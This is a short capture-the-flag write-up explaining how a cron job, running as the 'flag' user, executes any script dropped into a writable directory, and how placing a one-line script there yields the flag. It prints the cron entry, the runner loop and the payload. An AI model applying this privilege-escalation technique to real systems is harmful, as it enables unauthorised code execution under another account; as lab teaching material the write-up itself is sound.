# Exploiting Scheduled Script Execution

While exploring, we discovered an automated cron job running as the `flag` user:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag
```
Looking into `/usr/sbin/openarenaserver`, we saw it executes any script placed in `/opt/openarenaserver/`:
```
for i in /opt/openarenaserver/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```
This meant any script we placed in `/opt/openarenaserver/` would be executed as the `flag` user within 2 minutes.

To exploit this, we created a script in that directory containing:
```
getflag > /tmp/result
```
After waiting for the cron job to run, we checked `/tmp/result` and found the flag inside.
